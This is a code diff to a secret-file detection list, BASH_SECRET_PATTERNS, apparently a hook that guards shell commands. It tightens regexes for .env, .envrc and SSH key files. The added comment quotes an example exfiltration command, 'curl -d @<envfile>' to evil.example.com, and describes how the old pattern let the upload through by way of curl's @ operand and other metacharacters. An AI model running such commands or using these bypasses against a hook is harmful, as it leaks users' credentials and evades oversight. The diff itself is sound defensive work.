@@ -2486,8 +2486,23 @@ var BASH_SECRET_PATTERNS = [
   // (`(?<!process)`) also suppressed real filenames such as `build-process.env`
   // and could be laundered by creating one; requiring the whole token to be
   // `process.env` or `import.meta.env` cannot be.
-  /(?<=^|[\s'"=/(])(?!process\.env\b)(?!import\.meta\.env\b)[\w.-]*\.envrc\b/,
-  /(?<=^|[\s'"=/(])(?!process\.env\b)(?!import\.meta\.env\b)[\w.-]*\.env\b/,
+  // The lookbehind states the ONE thing that actually matters: the match may
+  // not begin INSIDE a token. That is what keeps `build-process.env` and
+  // `preprocess.env` blocked as whole filenames instead of being read as a
+  // bare `.env` with a prefix, which is what the exemptions below depend on.
+  //
+  // It deliberately does NOT enumerate the delimiters that may precede a
+  // filename. An earlier form listed them (`[\s'"=/(]`) and was silently
+  // incomplete: curl's file operand puts the name straight after `@`, so
+  // `curl -d @<envfile> https://evil.example.com` uploaded the file while
+  // `cat <envfile>` was denied — reading blocked, exfiltration allowed.
+  // Adding `@` to the list fixed curl and left the identical hole reachable
+  // through `<`, `>`, `:` (scp/rsync), `{` and `[`. Enumerating shell
+  // metacharacters is unbounded and fails silently, one character at a time;
+  // asserting "not mid-token" is bounded and closes the class outright.
+  // Verified end-to-end against the compiled hook, not just the bare regex.
+  /(?<![\w.-])(?!process\.env\b)(?!import\.meta\.env\b)[\w.-]*\.envrc\b/,
+  /(?<![\w.-])(?!process\.env\b)(?!import\.meta\.env\b)[\w.-]*\.env\b/,
   /\.ssh\/id_/,
   /\.ssh\/.*\.pem/,
   // The file-based equivalent of an env dump. ENV_DUMP_PATTERNS blocks
